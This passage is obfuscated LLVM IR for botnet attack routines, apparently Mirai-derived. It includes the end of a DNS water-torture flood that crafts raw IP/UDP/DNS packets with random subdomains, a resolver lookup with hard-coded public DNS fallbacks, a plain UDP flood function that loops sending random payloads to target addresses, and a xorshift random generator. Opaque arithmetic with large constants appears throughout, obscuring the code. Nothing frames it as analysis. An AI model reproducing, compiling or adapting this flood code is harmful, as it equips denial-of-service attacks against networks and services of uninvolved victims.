  store i32 0, i32* %9, align 4
  br label %342

; <label>:342:                                    ; preds = %511, %341
  %343 = load i32, i32* %9, align 4
  %344 = load i8, i8* %5, align 1
  %345 = zext i8 %344 to i32
  %346 = icmp slt i32 %343, %345
  br i1 %346, label %347, label %516

; <label>:347:                                    ; preds = %342
  %348 = load i8**, i8*** %11, align 8
  %349 = load i32, i32* %9, align 4
  %350 = sext i32 %349 to i64
  %351 = getelementptr inbounds i8*, i8** %348, i64 %350
  %352 = load i8*, i8** %351, align 8
  store i8* %352, i8** %32, align 8
  %353 = load i8*, i8** %32, align 8
  %354 = bitcast i8* %353 to %struct.iphdr*
  store %struct.iphdr* %354, %struct.iphdr** %33, align 8
  %355 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %356 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %355, i64 1
  %357 = bitcast %struct.iphdr* %356 to %struct.udphdr*
  store %struct.udphdr* %357, %struct.udphdr** %34, align 8
  %358 = load %struct.udphdr*, %struct.udphdr** %34, align 8
  %359 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %358, i64 1
  %360 = bitcast %struct.udphdr* %359 to %struct.dnshdr*
  store %struct.dnshdr* %360, %struct.dnshdr** %35, align 8
  %361 = load %struct.dnshdr*, %struct.dnshdr** %35, align 8
  %362 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %361, i64 1
  %363 = bitcast %struct.dnshdr* %362 to i8*
  %364 = getelementptr inbounds i8, i8* %363, i64 1
  store i8* %364, i8** %36, align 8
  %365 = load i16, i16* %13, align 2
  %366 = zext i16 %365 to i32
  %367 = icmp eq i32 %366, 65535
  br i1 %367, label %368, label %381

; <label>:368:                                    ; preds = %347
  %369 = call i32 @rand_next()
  %370 = xor i32 %369, -1
  %371 = xor i32 65535, -1
  %372 = xor i32 -770496740, -1
  %373 = or i32 %370, %371
  %374 = or i32 -770496740, %372
  %375 = xor i32 %373, -1
  %376 = and i32 %375, %374
  %377 = and i32 %369, 65535
  %378 = trunc i32 %376 to i16
  %379 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %380 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %379, i32 0, i32 3
  store i16 %378, i16* %380, align 4
  br label %381

; <label>:381:                                    ; preds = %368, %347
  %382 = load i16, i16* %16, align 2
  %383 = zext i16 %382 to i32
  %384 = icmp eq i32 %383, 65535
  br i1 %384, label %385, label %394

; <label>:385:                                    ; preds = %381
  %386 = call i32 @rand_next()
  %387 = xor i32 65535, -1
  %388 = xor i32 %386, %387
  %389 = and i32 %388, %386
  %390 = and i32 %386, 65535
  %391 = trunc i32 %389 to i16
  %392 = load %struct.udphdr*, %struct.udphdr** %34, align 8
  %393 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %392, i32 0, i32 0
  store i16 %391, i16* %393, align 2
  br label %394

; <label>:394:                                    ; preds = %385, %381
  %395 = load i16, i16* %17, align 2
  %396 = zext i16 %395 to i32
  %397 = icmp eq i32 %396, 65535
  br i1 %397, label %398, label %407

; <label>:398:                                    ; preds = %394
  %399 = call i32 @rand_next()
  %400 = xor i32 65535, -1
  %401 = xor i32 %399, %400
  %402 = and i32 %401, %399
  %403 = and i32 %399, 65535
  %404 = trunc i32 %402 to i16
  %405 = load %struct.udphdr*, %struct.udphdr** %34, align 8
  %406 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %405, i32 0, i32 1
  store i16 %404, i16* %406, align 2
  br label %407

; <label>:407:                                    ; preds = %398, %394
  %408 = load i16, i16* %18, align 2
  %409 = zext i16 %408 to i32
  %410 = icmp eq i32 %409, 65535
  br i1 %410, label %411, label %420

; <label>:411:                                    ; preds = %407
  %412 = call i32 @rand_next()
  %413 = xor i32 65535, -1
  %414 = xor i32 %412, %413
  %415 = and i32 %414, %412
  %416 = and i32 %412, 65535
  %417 = trunc i32 %415 to i16
  %418 = load %struct.dnshdr*, %struct.dnshdr** %35, align 8
  %419 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %418, i32 0, i32 0
  store i16 %417, i16* %419, align 2
  br label %420

; <label>:420:                                    ; preds = %411, %407
  %421 = load i8*, i8** %36, align 8
  %422 = load i8, i8* %19, align 1
  %423 = zext i8 %422 to i32
  call void @rand_alphastr(i8* %421, i32 %423)
  %424 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %425 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %424, i32 0, i32 7
  store i16 0, i16* %425, align 2
  %426 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %427 = bitcast %struct.iphdr* %426 to i16*
  %428 = call zeroext i16 @checksum_generic(i16* %427, i32 20)
  %429 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %430 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %429, i32 0, i32 7
  store i16 %428, i16* %430, align 2
  %431 = load %struct.udphdr*, %struct.udphdr** %34, align 8
  %432 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %431, i32 0, i32 3
  store i16 0, i16* %432, align 2
  %433 = load %struct.iphdr*, %struct.iphdr** %33, align 8
  %434 = load %struct.udphdr*, %struct.udphdr** %34, align 8
  %435 = bitcast %struct.udphdr* %434 to i8*
  %436 = load %struct.udphdr*, %struct.udphdr** %34, align 8
  %437 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %436, i32 0, i32 2
  %438 = load i16, i16* %437, align 2
  %439 = load i8, i8* %19, align 1
  %440 = zext i8 %439 to i64
  %441 = sub i64 0, %440
  %442 = sub i64 21, %441
  %443 = add i64 21, %440
  %444 = sub i64 %442, -8081132107972155914
  %445 = add i64 %444, 2
  %446 = add i64 %445, -8081132107972155914
  %447 = add i64 %442, 2
  %448 = load i32, i32* %21, align 4
  %449 = sext i32 %448 to i64
  %450 = sub i64 0, %446
  %451 = sub i64 0, %449
  %452 = add i64 %450, %451
  %453 = sub i64 0, %452
  %454 = add i64 %446, %449
  %455 = sub i64 %453, -6811543659457865213
  %456 = add i64 %455, 4
  %457 = add i64 %456, -6811543659457865213
  %458 = add i64 %453, 4
  %459 = trunc i64 %457 to i32
  %460 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %433, i8* %435, i16 zeroext %438, i32 %459)
  %461 = load %struct.udphdr*, %struct.udphdr** %34, align 8
  %462 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %461, i32 0, i32 3
  store i16 %460, i16* %462, align 2
  %463 = load i32, i32* %22, align 4
  %464 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %465 = load i32, i32* %9, align 4
  %466 = sext i32 %465 to i64
  %467 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %464, i64 %466
  %468 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %467, i32 0, i32 0
  %469 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %468, i32 0, i32 2
  %470 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %469, i32 0, i32 0
  store i32 %463, i32* %470, align 4
  %471 = load %struct.udphdr*, %struct.udphdr** %34, align 8
  %472 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %471, i32 0, i32 1
  %473 = load i16, i16* %472, align 2
  %474 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %475 = load i32, i32* %9, align 4
  %476 = sext i32 %475 to i64
  %477 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %474, i64 %476
  %478 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %477, i32 0, i32 0
  %479 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %478, i32 0, i32 1
  store i16 %473, i16* %479, align 2
  %480 = load i32, i32* %10, align 4
  %481 = load i8*, i8** %32, align 8
  %482 = load i8, i8* %19, align 1
  %483 = zext i8 %482 to i64
  %484 = add i64 41, -4309457614426664579
  %485 = add i64 %484, %483
  %486 = sub i64 %485, -4309457614426664579
  %487 = add i64 41, %483
  %488 = sub i64 %486, 5430121773842837765
  %489 = add i64 %488, 2
  %490 = add i64 %489, 5430121773842837765
  %491 = add i64 %486, 2
  %492 = load i32, i32* %21, align 4
  %493 = sext i32 %492 to i64
  %494 = sub i64 %490, -6327413950644606842
  %495 = add i64 %494, %493
  %496 = add i64 %495, -6327413950644606842
  %497 = add i64 %490, %493
  %498 = sub i64 0, 4
  %499 = sub i64 %496, %498
  %500 = add i64 %496, 4
  %501 = bitcast %union.__CONST_SOCKADDR_ARG* %37 to %struct.sockaddr**
  %502 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %503 = load i32, i32* %9, align 4
  %504 = sext i32 %503 to i64
  %505 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %502, i64 %504
  %506 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %505, i32 0, i32 0
  %507 = bitcast %struct.sockaddr_in* %506 to %struct.sockaddr*
  store %struct.sockaddr* %507, %struct.sockaddr** %501, align 8
  %508 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %37, i32 0, i32 0
  %509 = load %struct.sockaddr*, %struct.sockaddr** %508, align 8
  %510 = call i64 @sendto(i32 %480, i8* %481, i64 %499, i32 16384, %struct.sockaddr* %509, i32 16)
  br label %511

; <label>:511:                                    ; preds = %420
  %512 = load i32, i32* %9, align 4
  %513 = sub i32 0, 1
  %514 = sub i32 %512, %513
  %515 = add nsw i32 %512, 1
  store i32 %514, i32* %9, align 4
  br label %342

; <label>:516:                                    ; preds = %342
  br label %341

; <label>:517:                                    ; preds = %92, %86, %80
  ret void
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @get_dns_resolver() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca [2048 x i8], align 16
  %6 = alloca i32, align 4
  %7 = alloca [32 x i8], align 16
  %8 = alloca i8, align 1
  %9 = alloca i8, align 1
  %10 = alloca i8, align 1
  call void @table_unlock_val(i8 zeroext 30)
  %11 = call i8* @table_retrieve_val(i32 30, i32* null)
  %12 = call i32 (i8*, i32, ...) @open(i8* %11, i32 0)
  store i32 %12, i32* %2, align 4
  call void @table_lock_val(i8 zeroext 30)
  %13 = load i32, i32* %2, align 4
  %14 = icmp sge i32 %13, 0
  br i1 %14, label %15, label %107

; <label>:15:                                     ; preds = %0
  %16 = load i32, i32* %2, align 4
  %17 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i32 0, i32 0
  %18 = call i64 @read(i32 %16, i8* %17, i64 2048)
  %19 = trunc i64 %18 to i32
  store i32 %19, i32* %3, align 4
  %20 = load i32, i32* %2, align 4
  %21 = call i32 @close(i32 %20)
  call void @table_unlock_val(i8 zeroext 31)
  %22 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i32 0, i32 0
  %23 = load i32, i32* %3, align 4
  %24 = call i8* @table_retrieve_val(i32 31, i32* null)
  %25 = call i32 @util_stristr(i8* %22, i32 %23, i8* %24)
  store i32 %25, i32* %4, align 4
  call void @table_lock_val(i8 zeroext 31)
  %26 = load i32, i32* %4, align 4
  %27 = icmp ne i32 %26, -1
  br i1 %27, label %28, label %106

; <label>:28:                                     ; preds = %15
  store i8 0, i8* %8, align 1
  store i8 0, i8* %9, align 1
  %29 = load i32, i32* %4, align 4
  store i32 %29, i32* %6, align 4
  br label %30

; <label>:30:                                     ; preds = %92, %28
  %31 = load i32, i32* %6, align 4
  %32 = load i32, i32* %3, align 4
  %33 = icmp slt i32 %31, %32
  br i1 %33, label %34, label %99

; <label>:34:                                     ; preds = %30
  %35 = load i32, i32* %6, align 4
  %36 = sext i32 %35 to i64
  %37 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i64 0, i64 %36
  %38 = load i8, i8* %37, align 1
  store i8 %38, i8* %10, align 1
  %39 = load i8, i8* %8, align 1
  %40 = icmp ne i8 %39, 0
  br i1 %40, label %52, label %41

; <label>:41:                                     ; preds = %34
  %42 = load i8, i8* %10, align 1
  %43 = sext i8 %42 to i32
  %44 = icmp eq i32 %43, 32
  br i1 %44, label %49, label %45

; <label>:45:                                     ; preds = %41
  %46 = load i8, i8* %10, align 1
  %47 = sext i8 %46 to i32
  %48 = icmp eq i32 %47, 9
  br i1 %48, label %49, label %50

; <label>:49:                                     ; preds = %45, %41
  br label %92

; <label>:50:                                     ; preds = %45
  store i8 1, i8* %8, align 1
  br label %51

; <label>:51:                                     ; preds = %50
  br label %52

; <label>:52:                                     ; preds = %51, %34
  %53 = load i8, i8* %10, align 1
  %54 = sext i8 %53 to i32
  %55 = icmp ne i32 %54, 46
  br i1 %55, label %56, label %64

; <label>:56:                                     ; preds = %52
  %57 = load i8, i8* %10, align 1
  %58 = sext i8 %57 to i32
  %59 = icmp slt i32 %58, 48
  br i1 %59, label %72, label %60

; <label>:60:                                     ; preds = %56
  %61 = load i8, i8* %10, align 1
  %62 = sext i8 %61 to i32
  %63 = icmp sgt i32 %62, 57
  br i1 %63, label %72, label %64

; <label>:64:                                     ; preds = %60, %52
  %65 = load i32, i32* %6, align 4
  %66 = load i32, i32* %3, align 4
  %67 = add i32 %66, 2079215362
  %68 = sub i32 %67, 1
  %69 = sub i32 %68, 2079215362
  %70 = sub nsw i32 %66, 1
  %71 = icmp eq i32 %65, %69
  br i1 %71, label %72, label %91

; <label>:72:                                     ; preds = %64, %60, %56
  %73 = getelementptr inbounds [32 x i8], [32 x i8]* %7, i32 0, i32 0
  %74 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i32 0, i32 0
  %75 = load i32, i32* %4, align 4
  %76 = sext i32 %75 to i64
  %77 = getelementptr inbounds i8, i8* %74, i64 %76
  %78 = load i32, i32* %6, align 4
  %79 = load i32, i32* %4, align 4
  %80 = sub i32 %78, 1084118395
  %81 = sub i32 %80, %79
  %82 = add i32 %81, 1084118395
  %83 = sub nsw i32 %78, %79
  call void @util_memcpy(i8* %73, i8* %77, i32 %82)
  %84 = load i32, i32* %6, align 4
  %85 = load i32, i32* %4, align 4
  %86 = sub i32 0, %85
  %87 = add i32 %84, %86
  %88 = sub nsw i32 %84, %85
  %89 = sext i32 %87 to i64
  %90 = getelementptr inbounds [32 x i8], [32 x i8]* %7, i64 0, i64 %89
  store i8 0, i8* %90, align 1
  store i8 1, i8* %9, align 1
  br label %99

; <label>:91:                                     ; preds = %64
  br label %92

; <label>:92:                                     ; preds = %91, %49
  %93 = load i32, i32* %6, align 4
  %94 = sub i32 0, %93
  %95 = sub i32 0, 1
  %96 = add i32 %94, %95
  %97 = sub i32 0, %96
  %98 = add nsw i32 %93, 1
  store i32 %97, i32* %6, align 4
  br label %30

; <label>:99:                                     ; preds = %72, %30
  %100 = load i8, i8* %9, align 1
  %101 = icmp ne i8 %100, 0
  br i1 %101, label %102, label %105

; <label>:102:                                    ; preds = %99
  %103 = getelementptr inbounds [32 x i8], [32 x i8]* %7, i32 0, i32 0
  %104 = call i32 @inet_addr(i8* %103) #6
  store i32 %104, i32* %1, align 4
  br label %118

; <label>:105:                                    ; preds = %99
  br label %106

; <label>:106:                                    ; preds = %105, %15
  br label %107

; <label>:107:                                    ; preds = %106, %0
  %108 = call i32 @rand_next()
  %109 = urem i32 %108, 4
  switch i32 %109, label %118 [
    i32 0, label %110
    i32 1, label %112
    i32 2, label %114
    i32 3, label %116
  ]

; <label>:110:                                    ; preds = %107
  %111 = call i32 @htonl(i32 134744072) #7
  store i32 %111, i32* %1, align 4
  br label %118

; <label>:112:                                    ; preds = %107
  %113 = call i32 @htonl(i32 1246898730) #7
  store i32 %113, i32* %1, align 4
  br label %118

; <label>:114:                                    ; preds = %107
  %115 = call i32 @htonl(i32 1074151430) #7
  store i32 %115, i32* %1, align 4
  br label %118

; <label>:116:                                    ; preds = %107
  %117 = call i32 @htonl(i32 67240450) #7
  store i32 %117, i32* %1, align 4
  br label %118

; <label>:118:                                    ; preds = %116, %114, %112, %110, %107, %102
  %119 = load i32, i32* %1, align 4
  ret i32 %119
}

declare i32 @open(i8*, i32, ...) #3

declare i64 @read(i32, i8*, i64) #3

; Function Attrs: noinline nounwind uwtable
define void @attack_udp_plain(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i8**, align 8
  %11 = alloca i32*, align 8
  %12 = alloca i16, align 2
  %13 = alloca i16, align 2
  %14 = alloca i16, align 2
  %15 = alloca i8, align 1
  %16 = alloca %struct.sockaddr_in, align 4
  %17 = alloca %struct.iphdr*, align 8
  %18 = alloca %struct.udphdr*, align 8
  %19 = alloca i8*, align 8
  %20 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %21 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %22 = alloca i8*, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %23 = load i8, i8* %5, align 1
  %24 = zext i8 %23 to i64
  %25 = call noalias i8* @calloc(i64 %24, i64 8) #6
  %26 = bitcast i8* %25 to i8**
  store i8** %26, i8*** %10, align 8
  %27 = load i8, i8* %5, align 1
  %28 = zext i8 %27 to i64
  %29 = call noalias i8* @calloc(i64 %28, i64 4) #6
  %30 = bitcast i8* %29 to i32*
  store i32* %30, i32** %11, align 8
  %31 = load i8, i8* %7, align 1
  %32 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %33 = call i32 @attack_get_opt_int(i8 zeroext %31, %struct.attack_option* %32, i8 zeroext 7, i32 65535)
  %34 = trunc i32 %33 to i16
  store i16 %34, i16* %12, align 2
  %35 = load i8, i8* %7, align 1
  %36 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %37 = call i32 @attack_get_opt_int(i8 zeroext %35, %struct.attack_option* %36, i8 zeroext 6, i32 65535)
  %38 = trunc i32 %37 to i16
  store i16 %38, i16* %13, align 2
  %39 = load i8, i8* %7, align 1
  %40 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %41 = call i32 @attack_get_opt_int(i8 zeroext %39, %struct.attack_option* %40, i8 zeroext 0, i32 512)
  %42 = trunc i32 %41 to i16
  store i16 %42, i16* %14, align 2
  %43 = load i8, i8* %7, align 1
  %44 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %45 = call i32 @attack_get_opt_int(i8 zeroext %43, %struct.attack_option* %44, i8 zeroext 1, i32 1)
  %46 = trunc i32 %45 to i8
  store i8 %46, i8* %15, align 1
  %47 = bitcast %struct.sockaddr_in* %16 to i8*
  call void @llvm.memset.p0i8.i64(i8* %47, i8 0, i64 16, i32 4, i1 false)
  %48 = load i16, i16* %13, align 2
  %49 = zext i16 %48 to i32
  %50 = icmp eq i32 %49, 65535
  br i1 %50, label %51, label %54

; <label>:51:                                     ; preds = %4
  %52 = call i32 @rand_next()
  %53 = trunc i32 %52 to i16
  store i16 %53, i16* %13, align 2
  br label %57

; <label>:54:                                     ; preds = %4
  %55 = load i16, i16* %13, align 2
  %56 = call zeroext i16 @htons(i16 zeroext %55) #7
  store i16 %56, i16* %13, align 2
  br label %57

; <label>:57:                                     ; preds = %54, %51
  store i32 0, i32* %9, align 4
  br label %58

; <label>:58:                                     ; preds = %173, %57
  %59 = load i32, i32* %9, align 4
  %60 = load i8, i8* %5, align 1
  %61 = zext i8 %60 to i32
  %62 = icmp slt i32 %59, %61
  br i1 %62, label %63, label %179

; <label>:63:                                     ; preds = %58
  %64 = call noalias i8* @calloc(i64 65535, i64 1) #6
  %65 = load i8**, i8*** %10, align 8
  %66 = load i32, i32* %9, align 4
  %67 = sext i32 %66 to i64
  %68 = getelementptr inbounds i8*, i8** %65, i64 %67
  store i8* %64, i8** %68, align 8
  %69 = load i16, i16* %12, align 2
  %70 = zext i16 %69 to i32
  %71 = icmp eq i32 %70, 65535
  br i1 %71, label %72, label %81

; <label>:72:                                     ; preds = %63
  %73 = call i32 @rand_next()
  %74 = trunc i32 %73 to i16
  %75 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %76 = load i32, i32* %9, align 4
  %77 = sext i32 %76 to i64
  %78 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %75, i64 %77
  %79 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %78, i32 0, i32 0
  %80 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %79, i32 0, i32 1
  store i16 %74, i16* %80, align 2
  br label %90

; <label>:81:                                     ; preds = %63
  %82 = load i16, i16* %12, align 2
  %83 = call zeroext i16 @htons(i16 zeroext %82) #7
  %84 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %85 = load i32, i32* %9, align 4
  %86 = sext i32 %85 to i64
  %87 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %84, i64 %86
  %88 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %87, i32 0, i32 0
  %89 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %88, i32 0, i32 1
  store i16 %83, i16* %89, align 2
  br label %90

; <label>:90:                                     ; preds = %81, %72
  %91 = call i32 @socket(i32 2, i32 2, i32 17) #6
  %92 = load i32*, i32** %11, align 8
  %93 = load i32, i32* %9, align 4
  %94 = sext i32 %93 to i64
  %95 = getelementptr inbounds i32, i32* %92, i64 %94
  store i32 %91, i32* %95, align 4
  %96 = icmp eq i32 %91, -1
  br i1 %96, label %97, label %98

; <label>:97:                                     ; preds = %90
  ret void

; <label>:98:                                     ; preds = %90
  %99 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 0
  store i16 2, i16* %99, align 4
  %100 = load i16, i16* %13, align 2
  %101 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %100, i16* %101, align 2
  %102 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %103 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %102, i32 0, i32 0
  store i32 0, i32* %103, align 4
  %104 = load i32*, i32** %11, align 8
  %105 = load i32, i32* %9, align 4
  %106 = sext i32 %105 to i64
  %107 = getelementptr inbounds i32, i32* %104, i64 %106
  %108 = load i32, i32* %107, align 4
  %109 = bitcast %union.__CONST_SOCKADDR_ARG* %20 to %struct.sockaddr**
  %110 = bitcast %struct.sockaddr_in* %16 to %struct.sockaddr*
  store %struct.sockaddr* %110, %struct.sockaddr** %109, align 8
  %111 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %20, i32 0, i32 0
  %112 = load %struct.sockaddr*, %struct.sockaddr** %111, align 8
  %113 = call i32 @bind(i32 %108, %struct.sockaddr* %112, i32 16) #6
  %114 = icmp eq i32 %113, -1
  br i1 %114, label %115, label %116

; <label>:115:                                    ; preds = %98
  br label %116

; <label>:116:                                    ; preds = %115, %98
  %117 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %118 = load i32, i32* %9, align 4
  %119 = sext i32 %118 to i64
  %120 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %117, i64 %119
  %121 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %120, i32 0, i32 2
  %122 = load i8, i8* %121, align 4
  %123 = zext i8 %122 to i32
  %124 = icmp slt i32 %123, 32
  br i1 %124, label %125, label %154

; <label>:125:                                    ; preds = %116
  %126 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %127 = load i32, i32* %9, align 4
  %128 = sext i32 %127 to i64
  %129 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %126, i64 %128
  %130 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %129, i32 0, i32 1
  %131 = load i32, i32* %130, align 4
  %132 = call i32 @ntohl(i32 %131) #7
  %133 = call i32 @rand_next()
  %134 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %135 = load i32, i32* %9, align 4
  %136 = sext i32 %135 to i64
  %137 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %134, i64 %136
  %138 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %137, i32 0, i32 2
  %139 = load i8, i8* %138, align 4
  %140 = zext i8 %139 to i32
  %141 = lshr i32 %133, %140
  %142 = sub i32 %132, 636427900
  %143 = add i32 %142, %141
  %144 = add i32 %143, 636427900
  %145 = add i32 %132, %141
  %146 = call i32 @htonl(i32 %144) #7
  %147 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %148 = load i32, i32* %9, align 4
  %149 = sext i32 %148 to i64
  %150 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %147, i64 %149
  %151 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %150, i32 0, i32 0
  %152 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %151, i32 0, i32 2
  %153 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %152, i32 0, i32 0
  store i32 %146, i32* %153, align 4
  br label %154

; <label>:154:                                    ; preds = %125, %116
  %155 = load i32*, i32** %11, align 8
  %156 = load i32, i32* %9, align 4
  %157 = sext i32 %156 to i64
  %158 = getelementptr inbounds i32, i32* %155, i64 %157
  %159 = load i32, i32* %158, align 4
  %160 = bitcast %union.__CONST_SOCKADDR_ARG* %21 to %struct.sockaddr**
  %161 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %162 = load i32, i32* %9, align 4
  %163 = sext i32 %162 to i64
  %164 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %161, i64 %163
  %165 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %164, i32 0, i32 0
  %166 = bitcast %struct.sockaddr_in* %165 to %struct.sockaddr*
  store %struct.sockaddr* %166, %struct.sockaddr** %160, align 8
  %167 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %21, i32 0, i32 0
  %168 = load %struct.sockaddr*, %struct.sockaddr** %167, align 8
  %169 = call i32 @connect(i32 %159, %struct.sockaddr* %168, i32 16)
  %170 = icmp eq i32 %169, -1
  br i1 %170, label %171, label %172

; <label>:171:                                    ; preds = %154
  br label %172

; <label>:172:                                    ; preds = %171, %154
  br label %173

; <label>:173:                                    ; preds = %172
  %174 = load i32, i32* %9, align 4
  %175 = sub i32 %174, 122876651
  %176 = add i32 %175, 1
  %177 = add i32 %176, 122876651
  %178 = add nsw i32 %174, 1
  store i32 %177, i32* %9, align 4
  br label %58

; <label>:179:                                    ; preds = %58
  br label %180

; <label>:180:                                    ; preds = %214, %179
  store i32 0, i32* %9, align 4
  br label %181

; <label>:181:                                    ; preds = %208, %180
  %182 = load i32, i32* %9, align 4
  %183 = load i8, i8* %5, align 1
  %184 = zext i8 %183 to i32
  %185 = icmp slt i32 %182, %184
  br i1 %185, label %186, label %214

; <label>:186:                                    ; preds = %181
  %187 = load i8**, i8*** %10, align 8
  %188 = load i32, i32* %9, align 4
  %189 = sext i32 %188 to i64
  %190 = getelementptr inbounds i8*, i8** %187, i64 %189
  %191 = load i8*, i8** %190, align 8
  store i8* %191, i8** %22, align 8
  %192 = load i8, i8* %15, align 1
  %193 = icmp ne i8 %192, 0
  br i1 %193, label %194, label %198

; <label>:194:                                    ; preds = %186
  %195 = load i8*, i8** %22, align 8
  %196 = load i16, i16* %14, align 2
  %197 = zext i16 %196 to i32
  call void @rand_str(i8* %195, i32 %197)
  br label %198

; <label>:198:                                    ; preds = %194, %186
  %199 = load i32*, i32** %11, align 8
  %200 = load i32, i32* %9, align 4
  %201 = sext i32 %200 to i64
  %202 = getelementptr inbounds i32, i32* %199, i64 %201
  %203 = load i32, i32* %202, align 4
  %204 = load i8*, i8** %22, align 8
  %205 = load i16, i16* %14, align 2
  %206 = zext i16 %205 to i64
  %207 = call i64 @send(i32 %203, i8* %204, i64 %206, i32 16384)
  br label %208

; <label>:208:                                    ; preds = %198
  %209 = load i32, i32* %9, align 4
  %210 = sub i32 %209, 1532059849
  %211 = add i32 %210, 1
  %212 = add i32 %211, 1532059849
  %213 = add nsw i32 %209, 1
  store i32 %212, i32* %9, align 4
  br label %181

; <label>:214:                                    ; preds = %181
  br label %180
}

; Function Attrs: nounwind
declare i32 @bind(i32, %struct.sockaddr*, i32) #1

; Function Attrs: noinline nounwind uwtable
define i32 @rand_next() #0 {
  %1 = alloca i32, align 4
  %2 = load i32, i32* @x, align 4
  store i32 %2, i32* %1, align 4
  %3 = load i32, i32* %1, align 4
  %4 = shl i32 %3, 11
  %5 = load i32, i32* %1, align 4
  %6 = xor i32 %5, -1
  %7 = and i32 %4, %6
  %8 = xor i32 %4, -1
  %9 = and i32 %5, %8
  %10 = or i32 %7, %9
  %11 = xor i32 %5, %4
  store i32 %10, i32* %1, align 4
  %12 = load i32, i32* %1, align 4
  %13 = lshr i32 %12, 8
  %14 = load i32, i32* %1, align 4
  %15 = xor i32 %14, -1
  %16 = and i32 %13, %15
  %17 = xor i32 %13, -1
  %18 = and i32 %14, %17
  %19 = or i32 %16, %18
  %20 = xor i32 %14, %13
  store i32 %19, i32* %1, align 4
  %21 = load i32, i32* @y, align 4
  store i32 %21, i32* @x, align 4
  %22 = load i32, i32* @z, align 4
  store i32 %22, i32* @y, align 4
  %23 = load i32, i32* @w, align 4
  store i32 %23, i32* @z, align 4
  %24 = load i32, i32* @w, align 4
  %25 = lshr i32 %24, 19
  %26 = load i32, i32* @w, align 4
  %27 = xor i32 %26, -1
  %28 = and i32 %25, %27
  %29 = xor i32 %25, -1
  %30 = and i32 %26, %29
  %31 = or i32 %28, %30
  %32 = xor i32 %26, %25
  store i32 %31, i32* @w, align 4
  %33 = load i32, i32* %1, align 4
